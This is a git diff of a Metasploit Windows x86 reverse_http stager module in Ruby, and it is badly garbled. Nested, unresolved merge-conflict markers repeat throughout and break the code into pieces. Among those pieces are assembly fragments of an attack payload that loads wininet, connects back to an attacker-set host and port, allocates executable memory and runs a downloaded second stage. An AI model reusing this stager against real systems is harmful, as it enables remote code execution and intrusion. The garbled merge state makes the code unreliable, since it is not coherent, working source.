@@ -15,6 +15,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
@@ -43,12 +44,15 @@ require 'msf/core'
 <<<<<<< HEAD
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
 =======
@@ -307,12 +311,15 @@ module Msf
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -501,11 +508,14 @@ module Payload::Windows::ReverseHttp
 >>>>>>> pod/complex-payloads
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
 
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
@@ -608,12 +618,15 @@ module Msf
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -901,12 +914,18 @@ module Msf
       [
         OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
 >>>>>>> origin/feature/complex-payloads
+=======
+    register_advanced_options(
+      [
+        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
+>>>>>>> rapid7/feature/complex-payloads
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1201,6 +1220,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> pod/complex-payloads
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
@@ -1219,6 +1240,7 @@ module Payload::Windows::ReverseHttp
       exitfunk: datastore['EXITFUNC']
     }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1427,6 +1449,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
     generate_reverse_http(conf)
   end
 
@@ -1453,6 +1477,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1749,12 +1774,18 @@ module Payload::Windows::ReverseHttp
   def cached_size
     321
 >>>>>>> origin/feature/complex-payloads
+=======
+  # TODO: Use the CachedSize instead (PR #4894)
+  def cached_size
+    321
+>>>>>>> rapid7/feature/complex-payloads
   end
 
   #
   # Generate the URI for the initial stager
   #
   def generate_uri
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2036,6 +2067,8 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
     # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
     uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
 
@@ -2055,6 +2088,7 @@ module Payload::Windows::ReverseHttp
 
     # Generate a random 30+ byte URI
     "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
@@ -8229,6 +8263,41 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 =======
+=======
+  end
+
+  #
+  # Determine the maximum amount of space required for the features requested
+  #
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
+
+    # Add 100 bytes for the encoder to have some room
+    space += 100
+
+    # Add 251 bytes for large URI support (technically a little less, but lets go with it)
+    space += 251
+
+    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+    space += 31
+
+    # The final estimated size
+    space
+  end
+
+  #
+  # Dynamic payload generation
+  #
+  def asm_reverse_http(opts={})
+
+    #
+    # options should contain:
+    #    ssl:     (true|false)
+    #    url:     "/url_to_request"
+    #   host:     [hostname]
+    #   port:     [port]
+>>>>>>> rapid7/feature/complex-payloads
     # exitfunk:   [process|thread|seh|sleep]
     #
 
@@ -8270,7 +8339,10 @@ module Payload::Windows::ReverseHttp
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
+<<<<<<< HEAD
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
 
       set_retry:
         push.i8 8              ; retry 8 times should be enough
@@ -8294,6 +8366,7 @@ module Payload::Windows::ReverseHttp
                                ; DWORD_PTR dwContext (NULL) [6]
                                ; dwFlags [7]
         push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
@@ -8340,10 +8413,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> pod/complex-payloads
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8575,6 +8651,8 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
       server_uri:              ;  server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
@@ -8584,6 +8662,7 @@ module Payload::Windows::ReverseHttp
 
       httpopenrequest:
                                ; dwContext (NULL) [8]
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
@@ -8663,12 +8742,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8749,10 +8831,14 @@ module Payload::Windows::ReverseHttp
 =======
         push eax               ; hConnection
 >>>>>>> origin/feature/complex-payloads
+=======
+        push eax               ; hConnection
+>>>>>>> rapid7/feature/complex-payloads
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8819,6 +8905,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
       send_request:
       ^
 
@@ -8840,6 +8928,7 @@ module Payload::Windows::ReverseHttp
           push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
           call ebp
         ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -9037,6 +9126,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
     end
 
     asm << %Q^
@@ -9056,6 +9147,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9180,6 +9272,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
       ^
 
       if opts[:exitfunk]
@@ -9195,6 +9289,7 @@ module Payload::Windows::ReverseHttp
           ^
       end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9490,6 +9585,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
       asm << %Q^
         allocate_memory:
           push.i8 0x40           ; PAGE_EXECUTE_READWRITE
@@ -9537,6 +9634,7 @@ module Payload::Windows::ReverseHttp
       if opts[:exitfunk]
         asm << asm_exitfunk(opts)
       end
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9736,6 +9834,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> origin/feature/complex-payloads
+=======
+>>>>>>> rapid7/feature/complex-payloads
     asm
   end
 
@@ -9767,6 +9867,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -9949,6 +10050,9 @@ module Payload::Windows::ReverseHttp
 =======
 
 >>>>>>> origin/feature/complex-payloads
+=======
+
+>>>>>>> rapid7/feature/complex-payloads
 end
 
 end
